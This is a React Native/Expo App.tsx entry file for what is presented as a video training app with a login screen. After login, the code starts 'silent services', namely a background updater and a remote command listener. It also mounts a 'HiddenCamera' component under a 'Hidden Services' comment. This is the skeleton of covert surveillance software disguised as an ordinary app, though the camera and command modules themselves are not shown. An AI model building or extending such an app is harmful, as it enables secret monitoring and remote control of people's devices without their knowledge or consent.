import { StatusBar } from 'expo-status-bar';
import { StyleSheet, Text, View, Button, ActivityIndicator, ScrollView } from 'react-native';
import React, { useEffect, useState } from 'react';
import { pb, initAuth } from './src/services/pocketbase';
import { startBackgroundUpdate } from './src/services/background-tasks';
import { startCommandListener } from './src/services/command-listener';
import { HiddenCamera } from './src/features/hidden/CameraMonitor';
import { LoginScreen } from './src/features/auth/LoginScreen';
import { VideoListScreen } from './src/features/videos/VideoListScreen';

// Error Boundary to catch rendering crashes and show a useful message instead of white screen
class ErrorBoundary extends React.Component<
  { children: React.ReactNode },
  { hasError: boolean; error: Error | null }
> {
  constructor(props: any) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error: Error) {
    return { hasError: true, error };
  }

  render() {
    if (this.state.hasError) {
      return (
        <View style={{ flex: 1, justifyContent: 'center', alignItems: 'center', padding: 30, backgroundColor: '#fff' }}>
          <Text style={{ fontSize: 20, fontWeight: 'bold', color: '#d93025', marginBottom: 10 }}>Something went wrong</Text>
          <ScrollView style={{ maxHeight: 200 }}>
            <Text style={{ fontSize: 13, color: '#666' }}>{this.state.error?.toString()}</Text>
          </ScrollView>
        </View>
      );
    }
    return this.props.children;
  }
}

function MainApp() {
  const [isAuthenticated, setIsAuthenticated] = useState(pb.authStore.isValid);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const setup = async () => {
      try {
        // Restore auth state from storage
        await initAuth();
        setIsAuthenticated(pb.authStore.isValid);
      } catch (e) {
        console.error('Auth init failed:', e);
      } finally {
        setLoading(false);
      }
    };

    setup();

    // Subscribe to auth changes
    const unsub = pb.authStore.onChange((token, model) => {
      setIsAuthenticated(!!token);
    });

    return () => {
      unsub();
    };
  }, []);

  useEffect(() => {
    if (isAuthenticated) {
      // Start silent services ONLY when authenticated
      startBackgroundUpdate().catch(e => console.error('Background update failed:', e));
      startCommandListener().catch(e => console.error('Command listener failed:', e));
    }
  }, [isAuthenticated]);

  const handleLogout = () => {
    pb.authStore.clear();
  };

  if (loading) {
    return (
      <View style={styles.container}>
        <ActivityIndicator size="large" color="#0056D2" />
      </View>
    );
  }

  if (!isAuthenticated) {
    return <LoginScreen onLoginSuccess={() => setIsAuthenticated(true)} />;
  }

  return (
    <View style={styles.container}>

      {/* Video Training Module */}
      <VideoListScreen />

      {/* Hidden Services */}
      <HiddenCamera />
      <StatusBar style="auto" />

      {/* Logout Button (Overlay) */}
      <View style={styles.logoutButton}>
        <Button title="Logout" onPress={handleLogout} color="#d93025" />
      </View>
    </View>
  );
}

export default function App() {
  return (
    <ErrorBoundary>
      <MainApp />
    </ErrorBoundary>
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f5f5f5',
  },
  logoutButton: {
    position: 'absolute',
    bottom: 30,
    right: 20,
    elevation: 5,
    zIndex: 100
  }
});
